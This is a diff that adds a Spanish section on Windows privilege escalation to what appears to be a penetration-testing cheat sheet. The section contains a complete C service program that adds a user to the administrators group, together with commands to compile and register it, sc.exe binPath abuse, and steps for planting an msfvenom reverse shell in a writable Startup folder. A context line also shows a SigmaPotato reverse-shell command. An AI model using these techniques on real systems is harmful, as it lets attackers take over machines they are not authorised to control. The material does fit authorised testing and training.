@@ -1852,6 +1852,186 @@ Explicación:
 # Establecer una reverse shell con PowerShell
 ./SigmaPotato.exe --revshell <ip_addr> <port>
 ```
+##### Autorun
+Los Autorun en Windows son una característica que permite a los programas o scripts ejecutarse automáticamente cuando el sistema operativo se inicia o cuando se conecta un dispositivo externo, como una unidad USB o un disco óptico. Esta funcionalidad es útil para tareas automatizadas, pero también puede ser explotada por malware si no se configura correctamente.
+
+**Carpetas a chequear**
+
+```powershell
+C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+C:\Program Files\Autorun Program\
+```
+**Registros de Windows**
+
+```powershell
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+```
+Si hay algun programa de ejecución automática, es posible que pueda sobreescribirse el binario.
+
+Podemos utilizar `accessckk.exe` de SysInternals o `icacls` para comprobar los permisos del directorio.
+
+```powershell
+icacls C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+Si alguno de los archivos se puede escribir, se puede sobrescribir con una reverse shell o algun otro payload que nos permita escalar privilegios.
+
+##### Sericios Get-Acl hklm:\System\CurrentControlSet\services\regsvc
+
+Si una cuenta de usuario puede registrar servicios, entonces podemos crear un servicios malicioso para realizar una tarea privilegiada.
+
+El código que utilizaremo es el siguiente:
+
+```c
+#include <windows.h>  
+#include <stdio.h>  
+  
+#define SLEEP_TIME 5000  
+  
+SERVICE_STATUS ServiceStatus;    
+SERVICE_STATUS_HANDLE hStatus;    
+   
+void ServiceMain(int argc, char** argv);    
+void ControlHandler(DWORD request);    
+  
+//add the payload here  
+int Run()    
+{    
+   system("cmd.exe /k net localgroup administrators user /add");
+   return 0;    
+}    
+  
+int main()    
+{    
+   SERVICE_TABLE_ENTRY ServiceTable[2];  
+   ServiceTable[0].lpServiceName = "MyService";  
+   ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;  
+  
+   ServiceTable[1].lpServiceName = NULL;  
+   ServiceTable[1].lpServiceProc = NULL;  
+   
+   StartServiceCtrlDispatcher(ServiceTable);     
+   return 0;  
+}  
+  
+void ServiceMain(int argc, char** argv)    
+{    
+   ServiceStatus.dwServiceType        = SERVICE_WIN32;    
+   ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;    
+   ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN  
+;  
+   ServiceStatus.dwWin32ExitCode      = 0;    
+   ServiceStatus.dwServiceSpecificExitCode = 0;    
+   ServiceStatus.dwCheckPoint         = 0;    
+   ServiceStatus.dwWaitHint           = 0;    
+   
+   hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandl  
+er);    
+   Run();    
+      
+   ServiceStatus.dwCurrentState = SERVICE_RUNNING;    
+   SetServiceStatus (hStatus, &ServiceStatus);  
+   
+   while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)  
+   {  
+               Sleep(SLEEP_TIME);  
+   }  
+   return;    
+}  
+  
+void ControlHandler(DWORD request)    
+{    
+   switch(request)    
+   {    
+       case SERVICE_CONTROL_STOP:    
+                       ServiceStatus.dwWin32ExitCode = 0;    
+           ServiceStatus.dwCurrentState  = SERVICE_STOPPED;    
+           SetServiceStatus (hStatus, &ServiceStatus);  
+           return;    
+   
+       case SERVICE_CONTROL_SHUTDOWN:    
+           ServiceStatus.dwWin32ExitCode = 0;    
+           ServiceStatus.dwCurrentState  = SERVICE_STOPPED;    
+           SetServiceStatus (hStatus, &ServiceStatus);  
+           return;    
+          
+       default:  
+           break;  
+   }    
+   SetServiceStatus (hStatus,  &ServiceStatus);  
+   return;    
+}
+```
+
+En nuestra máquina atacante, compilamos el código con el siguiente comando:
+
+```c
+x86_64-w64-mingw32-gcc windows_service.c -o privesc.exe
+```
+
+Transferimos el binario a la máquina víctima y registramos el servicio.
+
+```powershell
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d [C:\Temp\privesc.exe] /f
+```
+
+Iniciamos el servicio
+
+```powershell
+sc.exe start regsvc
+```
+
+Confirmamos que el usuario se haya agregado al grupo administrators.
+
+```powershell
+net localgroup administrators
+```
+
+##### Servicios - `binPath`
+
+Similar al ataque de permisos en los servicios, podemos comprobar los permisos de un servicio para ver si podemos modificarlo.
+
+```powershell
+accesschk.exe /accepteula -uwcqv <SERVICE>
+```
+
+```powershell
+accesschk64.exe /accepteula -wuvc <SERVICE>
+```
+
+Si tenemos el permiso `SERVICE_CHANGE_CONFIG` podemos manipular un servicio.
+
+```powershell
+sc.exe config <SERVICE> binpath= "net localgroup administrators user /add"
+```
+
+```
+sc start <SERVICE>
+```
+
+##### Aplicaciones ejecutadas al inicio
+
+```powershell
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+- Si `BUILTIN\Users` tiene el privilegio `(F)`, podemos agregar un payload en esa ruta.
+- Usamos msfvenom para generar una revese shell
+- Colocamos la reverse shell en la carpeta
+- Iniciamos un lisetenr con Netcat
+- Espere a que un administrador inicie sesión
+
+##### GUI Apps
+
+Si una aplicación GUI está configurada para ejecutarse como administrador al iniciarse podemos abusar de esta para obtener una consola:
+
+Por ejemplo: MS-Paint
+
+- Archivo > Abrir -> Ingresar `file://C:/Windows/System32/cmd.exe`
 
 ###  9.2. <a name='linux-2'></a>Linux
 
